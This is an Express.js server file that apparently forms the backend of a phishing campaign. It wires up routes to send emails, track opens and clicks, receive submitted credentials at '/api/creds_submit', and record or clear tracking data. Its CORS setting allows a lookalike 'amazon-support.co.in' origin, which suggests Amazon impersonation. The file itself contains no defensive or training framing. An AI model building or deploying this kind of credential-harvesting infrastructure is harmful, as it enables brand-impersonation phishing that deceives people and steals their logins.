import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import path from 'path';
import fs from 'fs';
import https from 'https';

import emailOpened from './api/opened.js';
import emailClicked from './api/clicked.js';
import getcreds from './api/getcreds.js';
import sendEmails from './api/sendEmail.js';
import trackdata from './api/track.js';
import clearData from './api/cleardata.js';

const app = express();
const PORT = process.env.PORT || 443;

const sslOptions = {
  key: fs.readFileSync(path.resolve(process.env.SSL_KEY_PATH)),
  cert: fs.readFileSync(path.resolve(process.env.SSL_CERT_PATH)),
};

app.use(cors({
  origin: ['http://amazon-support.co.in:5173'],
  methods: ['GET', 'POST'],
  credentials: true
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use('/pages', express.static(path.join(path.resolve(), 'pages')));

app.post('/sendEmail', sendEmails);
// app.get('/api/track_open', emailOpened);
app.get('/api/clicked', emailClicked);
app.post('/api/creds_submit', getcreds);
app.post('/api/track', trackdata);
app.post('/api/cleardata', clearData);



// Start HTTPS server
https.createServer(sslOptions, app).listen(PORT, () => {
  console.log(`🔒 HTTPS server running on port ${PORT}`);
});
